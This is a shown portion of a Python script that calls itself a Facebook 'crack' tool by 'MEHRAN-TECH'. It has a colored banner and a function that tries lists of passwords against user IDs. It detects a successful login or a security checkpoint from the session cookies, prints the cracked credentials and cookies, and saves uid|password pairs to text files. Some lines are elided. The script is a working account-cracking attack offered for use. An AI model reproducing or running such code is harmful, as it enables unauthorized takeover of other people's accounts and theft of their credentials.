#---------------------[Hk-MEHRANK]---------------------#
#MEHRAN AND  IS THE BEST OF THE CRACK TOOLS SYESTUM#
...
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[\033[1;33m[•] AUTHOR   \33[0;m:\033[1;35m MEHRAN & \033[1;36m MEHRAN 
╠══[\033[1;32m[•] FACEBOOK \033[1;32m:\033[1;32m MEHRAN & \033[1;33m 
╠══[\033[1;35m[•] TEAM \033[1;34m    :\033[1;33m MEHRAN-TECH
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r[\033[1;97m MEHRAN \033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MEHRAN-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
                open('MEHRAN -OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('[MEHRAN -CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('MEHRAN -CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
